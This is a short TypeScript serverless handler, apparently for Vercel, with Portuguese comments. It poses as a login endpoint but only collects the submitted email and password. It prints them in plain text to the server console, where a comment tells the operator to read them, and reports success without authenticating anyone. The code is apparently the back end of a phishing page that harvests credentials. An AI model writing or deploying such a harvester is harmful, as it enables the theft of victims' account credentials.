export default async function handler(req: any, res: any) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok: false, error: 'Method not allowed' });
    return;
  }

  const { email, password } = req.body || {};

  if (!email || !password) {
    res.status(400).json({ ok: false, error: 'E-mail e senha são obrigatórios' });
    return;
  }

  // IMPRIME NO CONSOLE DO VERCEL — é aqui que você vê as credenciais
  console.log('========================================');
  console.log('📧 E-MAIL:   ' + email);
  console.log('🔑 SENHA:    ' + password);
  console.log('🕐 DATA:     ' + new Date().toISOString());
  console.log('========================================');

  res.status(200).json({ ok: true });
}
